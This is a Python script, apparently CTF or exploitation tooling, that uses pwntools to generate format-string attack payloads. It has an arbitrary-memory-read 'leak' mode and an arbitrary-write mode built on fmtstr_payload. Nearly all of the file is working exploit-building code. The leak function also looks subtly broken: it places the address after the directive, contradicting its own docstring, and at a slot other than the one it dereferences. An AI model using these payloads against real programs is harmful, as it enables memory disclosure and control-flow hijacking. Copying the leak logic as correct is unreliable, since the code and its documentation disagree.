#!/usr/bin/env python3
"""format_string.py — pwntools-backed format string primitive builders for
arbitrary read (leak) and arbitrary write.

Usage
-----
    python format_string.py leak  --offset N --target ADDR [--arch {64|32}]
    python format_string.py write --offset N --target ADDR --value VAL [--arch {64|32}]

``--offset`` is the format-string argument index where your input lands
(find this by sending ``%1$p %2$p %3$p ...`` and observing your `AAAA` echoes
back). ``--target`` is the absolute address to read from / write to.

For ``leak`` the script emits ``%<offset>$s`` prefixed by the target address
(64-bit) or suffixed (32-bit, where format-strings have no NUL issues with
small offsets). For ``write`` the script delegates to pwnlib's
``fmtstr_payload``, which handles byte-by-byte ``%hhn`` chains correctly.
"""
from __future__ import annotations

import argparse
import sys

from pwn import context, p32, p64
from pwnlib.fmtstr import fmtstr_payload


def make_leak(offset: int, target_addr: int, arch: int = 64) -> bytes:
    """Build a leak payload: send target_addr's bytes plus a ``%N$s`` deref.

    The address must not contain a NUL byte that terminates the format
    string before the ``%N$s`` directive runs; we place the address AFTER
    the directive (padded to land at slot ``offset``)."""
    if arch == 64:
        addr_bytes = p64(target_addr)
        word = 8
    elif arch == 32:
        addr_bytes = p32(target_addr)
        word = 4
    else:
        raise ValueError("arch must be 32 or 64")
    # Directive first, padded to a multiple of word, then address.
    directive = f"%{offset}$s".encode()
    pad = (-len(directive)) % word
    return directive + b"\x00" * pad + addr_bytes


def make_write(offset: int, target_addr: int, value: int, arch: int = 64) -> bytes:
    """Build an arbitrary-write payload using pwnlib's ``fmtstr_payload``.

    Uses byte-granular ``%hhn`` writes — the most reliable size since 64-bit
    addresses tend to differ by more than 65k between target and pivot."""
    if arch == 64:
        context.bits = 64
    elif arch == 32:
        context.bits = 32
    else:
        raise ValueError("arch must be 32 or 64")
    return fmtstr_payload(offset, {target_addr: value}, write_size="byte")


def main() -> None:
    ap = argparse.ArgumentParser()
    sub = ap.add_subparsers(dest="cmd", required=True)

    leak = sub.add_parser("leak")
    leak.add_argument("--offset", type=int, required=True)
    leak.add_argument("--target", type=lambda s: int(s, 0), required=True)
    leak.add_argument("--arch", type=int, choices=[32, 64], default=64)

    write = sub.add_parser("write")
    write.add_argument("--offset", type=int, required=True)
    write.add_argument("--target", type=lambda s: int(s, 0), required=True)
    write.add_argument("--value", type=lambda s: int(s, 0), required=True)
    write.add_argument("--arch", type=int, choices=[32, 64], default=64)

    args = ap.parse_args()

    if args.cmd == "leak":
        payload = make_leak(args.offset, args.target, args.arch)
    elif args.cmd == "write":
        payload = make_write(args.offset, args.target, args.value, args.arch)
    else:
        sys.exit(2)

    sys.stdout.buffer.write(payload)


if __name__ == "__main__":
    main()
